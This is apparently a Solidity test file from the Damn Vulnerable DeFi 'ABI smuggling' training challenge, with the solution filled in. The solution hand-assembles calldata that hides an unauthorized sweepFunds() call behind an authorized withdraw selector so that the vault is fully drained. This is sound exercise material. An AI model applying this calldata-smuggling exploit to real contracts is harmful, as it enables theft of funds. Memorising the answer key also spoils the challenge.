// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        // The attack leverages a trusted function AuthorizedExecutor::execute()
        // which expects the `actionData` to contain a valid, authorized function call.
        // By carefully constructing the calldata, the attack places an unauthorized function call
        // (such as `sweepFunds()`) deep inside the `actionData`, bypassing security checks.
        //
        // Goal is to produce the following calldata
        //
        // 1cff79cd                                                              // function selector: execute(address target, bytes calldata actionData)
        // 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264      // address target parameter
        // 0000000000000000000000000000000000000000000000000000000000000080      // bytes calldata actionData offset (measured from the start of the arguments block)
        // 0000000000000000000000000000000000000000000000000000000000000000      // zero-padding
        // d9caed1200000000000000000000000000000000000000000000000000000000      // withdraw() selector (which is authorized). execute() expects to find it here
        // 0000000000000000000000000000000000000000000000000000000000000044      // bytes calldata actionData offset
        //                                                                       // bytes calldata actionData payload
        //      85fb709d                                                         //     sweepFunds() selector (this function only checks that msg.sender == contract)
        //      00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea //     address receiver
        //      0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b //     IERC20 token

        bytes4 executeSelector = AuthorizedExecutor.execute.selector;
        bytes4 withdrawSelector = SelfAuthorizedVault.withdraw.selector;
        address targetAddress = address(vault);

        bytes memory payload = abi.encodeWithSelector(SelfAuthorizedVault.sweepFunds.selector, recovery, token);
        uint256 payloadLength = payload.length;

        bytes memory executeCalldata = new bytes(4 + 5 * 32 + payloadLength);
        assembly {
            // function selector: execute(address target, bytes calldata actionData)
            mstore(add(executeCalldata, 0x20), executeSelector)
            // address target parameter
            mstore(add(executeCalldata, 0x24), targetAddress)

            // bytes calldata actionData offset, measured from the start of the arguments block
            // we make sure that execute() finds an authorized
            mstore(add(executeCalldata, 0x44), 0x80)

            // execute() will check for the withdraw selector at the offset 4 + 32 * 3.
            // we zero-pad and then set an authorized selector for player it in that position
            mstore(add(executeCalldata, 0x64), 0x0)
            mstore(add(executeCalldata, 0x84), withdrawSelector)

            // bytes calldata actionData length and data
            mstore(add(executeCalldata, 0xa4), payloadLength)
            // skip the first 32 bytes, which store in the EVM the length of the payload
            let payloadPtr := add(payload, 0x20)
            // start writing at this point in executeCalldata
            let executeCalldataPtr := add(executeCalldata, 0xc4)
            // do the writing in chunks of 32 (0x20) bytes
            for { let i := 0 } lt(i, payloadLength) { i := add(i, 0x20) } {
                mstore(add(executeCalldataPtr, i), mload(add(payloadPtr, i)))
            }
        }

        (bool success,) = address(vault).call(executeCalldata);
        success;
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
